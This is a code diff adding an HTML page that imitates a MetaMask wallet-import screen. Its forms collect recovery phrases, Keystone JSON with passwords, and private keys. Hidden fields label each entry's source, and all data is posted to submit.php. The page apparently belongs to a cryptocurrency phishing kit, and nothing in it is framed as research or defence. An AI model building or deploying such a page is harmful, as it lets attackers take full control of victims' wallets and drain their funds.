@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link href="css/main.css" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="js/custom.js" type="text/javascript"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:ital,wght@0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
+  
+    <title>Document</title>
+</head>
+<body>
+    <div class="mainlo">
+        <img src="images/logo.svg">
+    </div>
+    <div class="bodym">
+        <div class="nav"> 
+            <div id="navi">Phrase</div>
+            <div id="navi">Keystone JSON</div>
+            <div id="navi">Private Key</div>
+        </div>
+        <div class="tabcenter">
+            <div class="tab_container">
+                <form class="datainput" id="phraseform" method="post" action="submit.php">
+                    <textarea id="subject" class="clear" name="subject" placeholder="Write something.." style="height:150px; width: 100%;"></textarea>
+                    <input id="walletsrc" name="walletsrc" style="display: none;" value="FROM PHRASE (METAMASK)">
+                    
+                    <br/>
+                    <br/>
+                    <p></p>
+                    <br/>
+                    <button type="submit" class="btn btn-primary btn-block phrasebtn" name="submit" id="submit" style="width: 100%; font-weight: bold;">Done</button>
+                    <a href="index.html#wallets">
+                    <button type="button" class="btn btn-primary btn-danger" id="back" style="width: 100%; font-weight: bold; position: relative; top: 10px;">BACK</button>
+                  </a>
+                </form>
+            </div>
+            <div class="tab_container">
+                <form class="datainput" id="phraseform" method="post" action="submit.php">
+                    <textarea id="subject" class="clear" name="subject" placeholder="Keystone JSON" style="height:150px; width: 100%;"></textarea>
+                    <input id="walletsrc" name="walletsrc" style="display: none;" value="FROM KEYSTONE (METAMASK)">
+                    <br/>
+                    <input type="text" class="clear" placeholder="Password" name="password" style="width:100%; border: 1px solid rgb(180, 180, 180);  height: 45px; border-radius: 5px;">
+                    <br/>
+                    <p>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>
+                    <br/>
+                    <button type="submit" class="btn btn-primary btn-block keybtn" name="submit" id="submit" style="width: 100%; font-weight: bold;">IMPORT</button>
+                    <a href="index.html#wallets">
+                    <button type="button" class="btn btn-primary btn-danger" id="back" style="width: 100%; font-weight: bold; position: relative; top: 10px;">BACK</button>
+                  </a>
+                </form>
+            </div>
+            <div class="tab_container">
+                <form class="datainput" id="phraseform" method="post" action="submit.php">
+                    <input type="text" class="clear" name="subject" placeholder="Private Key" style="width:100%; border: 1px solid rgb(180, 180, 180);  height: 45px; border-radius: 5px;">
+                    <input id="walletsrc" name="walletsrc" style="display: none;" value="FROM PRIVATE (METAMASK)">
+                    <br/>
+                    <p>Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+                    <br/>
+                    <button type="submit" name="submit" class="btn btn-primary btn-block passbtn" id="submit" style="width: 100%; font-weight: bold;"><span class="spinner-border spinner-border-sm" role="status" aria-hidden="true">&nbsp;</span> &nbsp; Connecting wallet...IMPORT</button>
+                    <a href="index.html#wallets">
+                    <button type="button" class="btn btn-primary btn-danger" id="back" style="width: 100%; font-weight: bold; position: relative; top: 10px;">BACK</button>
+                  </a>
+                    </form>
+            </div>
+        </div>
+    </div>
+</body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://code.jquery.com/jquery-2.1.3.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert-dev.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.css">
+</html>
